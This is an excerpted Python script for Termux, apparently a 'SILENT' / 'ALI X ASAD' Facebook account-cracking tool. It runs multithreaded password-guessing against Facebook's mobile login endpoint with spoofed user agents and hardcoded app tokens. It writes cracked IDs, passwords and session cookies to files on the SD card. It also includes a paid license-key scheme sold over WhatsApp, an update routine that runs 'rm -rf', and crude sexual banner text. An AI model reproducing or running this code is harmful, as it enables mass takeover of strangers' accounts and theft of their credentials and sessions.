...
def Setup():
	try:
		...
		if '8.7.2' in httpx.get(url).text:
			...
			time.sleep(1)
			os.system('rm -rf New && python ALI.py')
			exit()
	except ValueError:exit()
try:import httpx
except:exit(' Found error in http module! ')
xx=requests.get('https://raw.githubusercontent.com/SILENT110/files/main/ua.txt').text.splitlines()
def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;37m
...
----------------------------------------------
 Author    : 𝘼𝙇𝙄 𝙓 𝘼𝙎𝘼𝘿
 HEATERS : 😂 WAKT BURA NHI THA LOG HE HARAMI MILA
 Status    : 𝙁𝙍𝙀𝙀
 Version   : 8.7.2 \033[1;3m
 RDX: WAJA TUM HO
 SEX: KRNA KA DIL TO HA AP MAN JAO TO
 WOMEN:😂HAHAH
 ok ids will be saved in SILENT folder
----------------------------------------------""")
def line():
	print(f'\033[1;37m------------------------------------------------')
myid=uuid.uuid4().hex[:5].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrALIxxx-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrALIxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrALIxxx-cov', 'r').read()
kex=(f"SILENT-XD{uid}TS{key1}110E==")
...
def apv():
	try:
		...
		if kex in link:clear();main()
			...
			line()
			tks = ("Hi SILENT Sir, I Need To Buy Your Paid SILENT Tools Version 8.7.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
			print(' Run :  python ALI.py')
			line()
			exit()
	except ValueError:
		exit()
...
def file():
	...
	with tred(max_workers=20) as SILENT:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if mthd =='1':
				SILENT.submit(m1,ids,names,passlist,fbcr)
			elif mthd =='2':
				SILENT.submit(m2,ids,names,passlist,fbcr)
			elif mthd =='3':
				SILENT.submit(m3,ids,names,passlist,fbcr)
			else:
				SILENT.submit(m2,ids,names,passlist,fbcr)
	print('\033[1;37m')
	line()
...
def m1(ids,names,passlist,fbcr):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [SILENT-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			fbbv = str(random.randint(0000000000,9999999999))
			...
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(1111111111,9999999999))
			fblc = "zh_HK"
			fbfw = '1'
			fbrv = '0'
  ...
  'authority': 'p.facebook.com',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ALI-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/SILENT/ALI-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				...
				open('/sdcard/ASAD/ALI-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def m2(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [SILENT-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
  ...
  'authority': 'p.facebook.com',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ALI-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ALI/ALI-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ALI/ALI-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
...
def m3(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [SILENT-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ALI-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ALI/ALI-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ALI/ALI-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def rd(ids,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ASAD-XD] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
  ...
  'authority': 'p.facebook.com',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if "session_key" in po:
				uid = str(po['uid'])
				token = po['access_token']
				print('\r\r\033[1;32m [ALI-OK] '+uid+' | '+pas)
				oks.append(ids)
				open('/sdcard/ALI/ALI-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ALI/ALI-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
